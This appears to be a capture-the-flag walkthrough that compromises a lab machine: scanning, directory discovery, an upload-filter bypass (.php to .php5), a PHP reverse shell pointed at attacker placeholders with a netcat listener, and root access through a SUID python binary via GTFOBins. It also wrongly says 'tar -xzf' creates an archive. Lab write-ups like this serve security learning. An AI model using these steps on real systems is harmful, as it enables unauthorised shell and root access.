#### nmap scan ####

first we scan the open ports of the vulnerable machine using nmap.

```Terminal
nmap -sC -sV $IP_addr
```


we found 2 open ports-
**port 22 (ssh)**
**port 80 (http)**

The version of Apache running was 2.4.41



#### Gobuster tool####

we ran gobuster tool for enumerating the number of directories available in the machine


```Terminal
gobuster dir -u http://$IP_addr -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```


By using this command, we found hidden directories:
**uploads**
**css**
**js**
**panel**



#### Reverse shell ####

After finding the hidden directories, I went to the panel directory and found out we can upload files.

Note: we can use this particular command to bundle multiple files and directories into a single archive file-
```Terminal
tar -xzf php-reverse-shell-1.0.tar.gz
```


Using pentest monkey cheat sheet, we can download the .php reverse shell file and assign IP address of our attacking machine and the port number.


```php-changes
$IP = Attacker_machine
$port = Attacker_port
```


After attempting to upload the .php file, it throws an error for not accepting php file.

we can change the extension of the file from **.php** to .**php5**




#### Netcat ####

We use netcat to listen on a specific port in order to get a shell using reverse shell.

```Terminal
nc -nvlp 9999
```


After hosting the netcat, we go to **uploads** directory and click on the **.php5** file we have uploaded.

**Boom!! we get a shell!!**




#### Finding first flag####

now we search for a txt file **user.txt**

we use this particular linux command to find the text file:

```Terminal
find / -name user.txt 2>/dev/null
```

**find** - finds the search the user wants.
**/** - means to search everything.
**-name** - specifies that the user is going to insert the name of the file.
**user.txt** - file name.
**2>/dev/null** - this means dont show the lines for permission denied.


Then we recieve our first flag.



#### Privilege escalation ####

now we try to escalate our privileges to root.

we search for files with SUID permission (set user ID) .

```Terminal
find / -user root -perm /4000 2>/dev/null
```

**-perm** - this means permission.
**/4000** - unique number for SUID.

from the files we get in stdout, we have a file named **/usr/bin/python**

this can give us access to use python and escalate our privileges.


we go to a website named **gtfobins**, this site gives us the executable python command to escalate our privileges

**steps:**
1.go to gtfobins
2.filter python
3.choose category - SUID
4.copy and paste


**Note:** we paste the python code where python is available since we are unprivileged user.


**Boom!! We are root now!**

change directory to root and you will receive the **second flag!**